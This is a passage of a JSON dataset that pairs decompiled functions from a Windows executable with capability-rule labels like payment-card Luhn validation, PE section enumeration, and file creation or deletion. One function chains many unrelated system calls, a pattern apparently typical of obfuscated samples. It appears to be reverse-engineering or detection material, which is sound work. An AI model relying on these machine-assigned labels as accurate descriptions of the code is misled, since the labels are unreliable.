        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint * __cdecl fcn.004049bf(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00405370();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00404caf(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = 0x401584;\n    fcn.00404888(arg_8h_00 + 0xc);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 245
    },
    "00404a1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a1d(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x1c) {\n        fcn.004048cb(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00404a3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404a3c(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 0x10) = 0;\n    *(in_ECX + 0x14) = 0;\n    if (arg_8h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar2 = fcn.0040443a();\n        if (uVar2 < arg_8h) {\n            fcn.00404986();\n        }\n        iVar3 = fcn.00404442(arg_8h);\n        *(in_ECX + 0xc) = iVar3;\n        *(in_ECX + 0x10) = iVar3;\n        *(in_ECX + 0x14) = arg_8h * 0x1c + iVar3;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 243
    },
    "00404af1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404af1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00404a86(arg_8h, arg_ch, in_ECX + 8);\n    return;\n}\n",
        "token_count": 58
    },
    "00404b42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404b42(uint *param_1)\n\n{\n    fcn.00404b07();\n    fcn.00404298(*param_1);\n    return;\n}\n",
        "token_count": 43
    },
    "00405712": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405712(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004087a0(0x4118d8, 0xc);\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar1 = fcn.00406174();\n        *puVar1 = 0x16;\n        fcn.0040610c(0, 0, 0, 0, 0);\n    }\n    else {\n        uVar2 = fcn.0040939b();\n        fcn.004094b3(0, uVar2);\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0040939b(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        uVar2 = (**(unaff_EBP + 8))(uVar2);\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00405789();\n    }\n    fcn.004087e5();\n    return;\n}\n",
        "token_count": 336
    },
    "00405798": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405798(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00405712(fcn.0040961a, arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "00408c2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408c2c(uint arg_8h)\n\n{\n    fcn.00408b00(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 42
    },
    "0040aea5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040aeb9)\n// WARNING: Removing unreachable block (ram,0x0040aebf)\n// WARNING: Removing unreachable block (ram,0x0040aec1)\n\nvoid fcn.0040aea5(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "004034f6": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFilePart\n// WARNING: Variable defined which should be unmapped: lpNumberOfEventsRead\n\nvoid __cdecl fcn.004034f6(int32_t latency)\n\n{\n    code *pcVar1;\n    uchar auStack11300 [2048];\n    uchar auStack9252 [1024];\n    uchar auStack8228 [2048];\n    uint var_1820h;\n    uint var_1420h;\n    uint lpBuffer;\n    uint var_420h;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    int32_t iStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint *puStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint *puStack144;\n    uint uStack140;\n    uint *puStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint lpBytesRead;\n    uint lpNumberOfEventsRead;\n    uint lpFilePart;\n    \n    lpFilePart = 0x403503;\n    fcn.00404e90();\n    if (*0x5cfd54 == 0x37) {\n        lpBytesRead = 0;\n        uStack20 = 0;\n        uStack24 = 0;\n        uStack28 = 0x40351d;\n        (*_sym.imp.KERNEL32.dll_CommConfigDialogA)();\n        uStack28 = 0;\n        uStack32 = 0;\n        var_20h = 0;\n        uStack40 = 0;\n        uStack44 = 0x403527;\n        (*_sym.imp.KERNEL32.dll_CreateMailslotA)();\n        uStack44 = 0;\n        puStack48 = 0x40352e;\n        (*_sym.imp.KERNEL32.dll_GetDriveTypeW)();\n        puStack48 = &fcn.004034f6::lpBuffer;\n        uStack52 = 0;\n        uStack56 = 0x40353c;\n        (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)();\n        uStack56 = 0;\n        puStack60 = &fcn.004034f6::lpBytesRead;\n        uStack64 = 0;\n        puStack68 = &stack0xffffdbdc;\n        uStack72 = 0;\n        uStack76 = 0;\n        uStack80 = 0x401328;\n        uStack84 = 0x403556;\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)();\n        uStack84 = 0;\n        uStack88 = 0;\n        puStack92 = 0x40355e;\n        (*_sym.imp.KERNEL32.dll_MoveFileW)();\n        puStack92 = &fcn.004034f6::lpFilePart;\n        puStack96 = &fcn.004034f6::var_1420h;\n        uStack100 = 0;\n        uStack104 = 0;\n        uStack108 = 0;\n        uStack112 = 0;\n        uStack116 = 0x403573;\n        (*_sym.imp.KERNEL32.dll_SearchPathW)();\n        uStack116 = 0;\n        puStack120 = &stack0xffffdfdc;\n        uStack124 = 0;\n        puStack128 = 0x403582;\n        (*_sym.imp.KERNEL32.dll_FindNextVolumeMountPointW)();\n        puStack128 = &fcn.004034f6::lpNumberOfEventsRead;\n        uStack132 = 0;\n        puStack136 = &fcn.004034f6::var_20h;\n        uStack140 = 0;\n        puStack144 = 0x403592;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)();\n        puStack144 = &fcn.004034f6::var_420h;\n        uStack148 = 0;\n        uStack152 = 0x4035a0;\n        (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)();\n        uStack152 = 0;\n        uStack156 = 0;\n        uStack160 = 0;\n        uStack164 = 0x4035a9;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExW)();\n        uStack164 = 0;\n        puStack168 = &stack0xffffd3dc;\n        uStack172 = 0;\n        uStack176 = 0x4035b8;\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeMountPointW)();\n        uStack176 = 0;\n        uStack180 = 0x4035bf;\n        (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        uStack180 = 0x401330;\n        uStack184 = 0x4035ca;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStack184 = 0;\n        puStack188 = &fcn.004034f6::var_1820h;\n        uStack192 = 0x4035d8;\n        (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryA)();\n        uStack192 = 0x401338;\n        uStack196 = 0x4035e3;\n        (*_sym.imp.KERNEL32.dll_SetComputerNameA)();\n        pcVar1 = _sym.imp.KERNEL32.dll_CreateFileW;\n        uStack196 = 0;\n        uStack200 = 0;\n        uStack204 = 0;\n        uStack208 = 0;\n        uStack212 = 0;\n        uStack216 = 0;\n        uStack220 = 0x401350;\n        uStack224 = 0x4035f6;\n        (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        uStack224 = 0;\n        uStack228 = 0;\n        uStack232 = 0;\n        iStack236 = 0x4035ff;\n        (*_sym.imp.KERNEL32.dll_AddConsoleAliasW)();\n        iStack236 = latency;\n        uStack240 = 0x403608;\n        (*_sym.imp.KERNEL32.dll_RequestWakeupLatency)();\n        uStack240 = 0;\n        uStack244 = 0;\n        uStack248 = 0;\n        uStack252 = 0;\n        uStack256 = 0x403612;\n        (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)();\n        uStack256 = 0;\n        uStack260 = 0;\n        uStack264 = 0;\n        uStack268 = 0;\n        uStack272 = 0;\n        uStack276 = 0;\n        uStack280 = 0;\n        uStack284 = 0x40361b;\n        (*pcVar1)();\n        uStack284 = 0x403621;\n        (*_sym.imp.KERNEL32.dll_AreFileApisANSI)();\n        uStack284 = 0;\n        uStack288 = 0x401388;\n        uStack292 = 0;\n        uStack296 = 0x4013b0;\n        uStack300 = 0;\n        uStack304 = 0;\n        uStack308 = 0x403635;\n        (*_sym.imp.KERNEL32.dll_CompareStringW)();\n    }\n    *(*0x5cf900 + latency) = *(*0x5d0168 + 0x38d6 + latency);\n    return;\n}\n",
        "token_count": 1959
    },
    "0040f4b1": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040f4b1(void)\n\n{\n    *0x5b6af4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x402eb8, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 68
    },
    "00404b07": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404b07(int32_t param_1)\n\n{\n    if (*(param_1 + 0xc) != 0) {\n        fcn.00404af1(*(param_1 + 0xc), *(param_1 + 0x10));\n        fcn.00404298(*(param_1 + 0xc));\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 128
    },
    "00405aeb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405aeb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004087a0(0x411920, 0xc);\n    fcn.00407ca6(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x5d0190;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x5d018c;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00405b2f;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00405403(arg_8h_00);\ncode_r0x00405b2f:\n        fcn.00405403(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00405b52();\n    fcn.004087e5();\n    return;\n}\n",
        "token_count": 398
    },
    "004056e2": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004056e2(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.0040619a(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 118
    }
}